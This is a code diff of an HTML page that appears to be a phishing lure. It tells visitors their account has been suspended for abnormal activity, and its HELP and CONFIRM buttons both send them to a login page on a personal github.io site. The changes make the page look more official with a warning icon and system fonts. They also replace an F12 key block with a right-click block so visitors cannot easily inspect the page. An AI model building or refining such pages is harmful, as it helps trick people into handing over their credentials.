@@ -8,9 +8,11 @@
 
 <center>
 <div align="center" class="content">
- TIPS <hr><br>
+TIPS
+   <hr><br>
+
 <h6 style="color:red"> <i></i></h6><br>
-<p> There are abnormal activities with your account. It has been suspended. </p> <br> <br> <br> <br>
+<div class="warning">&#9888;</div><p> There are abnormal activities with your account. It has been suspended. </p> <br> <br> <br> <br>
 </py-script>
 <button  style="color:black; font-size: 18px; padding: 8px 24px;" class="center-left" onclick="window.location.href='https://teju0051.github.io/TService/login.html';"><b>HELP</b></button> 
 <button  style="font-size: 18px; padding: 10px 24px; background-color: yellow;" class="center-right" HELP onclick="window.location.href='https://teju0051.github.io/TService/login.html';"><b>CONFIRM</b></button> 
@@ -18,6 +20,12 @@
 </center>
 
 <style>
+  .warning {
+    color: red;
+    font-size: 50px;
+    margin-bottom: 20px;
+    font-family:system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+  }
   p{
     font-size: 20px;
   }
@@ -53,6 +61,7 @@ button {
   display: inline-block;
   border-color: grey;
   font-size: 200px;
+  font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
 }
 .center-left{
 top: 1000%;
@@ -67,6 +76,7 @@ bottom: 45%;
 transform: translateY(50%);
 transform: translateX(60%);
 background-color: yellow;
+font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
 
 }
 b{
@@ -80,17 +90,14 @@ p{
 button {
 padding: 5px;
 font-size: 14px;
+font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
 }
    
   </style>
- <script>document.onkeydown=function(e)
-    {
-      if(event.keyCode == 123)
-      {
-        return false;
-    }}
-
-   
+ <script>
+  document.addEventListener('contextmenu', function (event) {
+    event.preventDefault();
+  });
 </script>
 </body>
 </html>
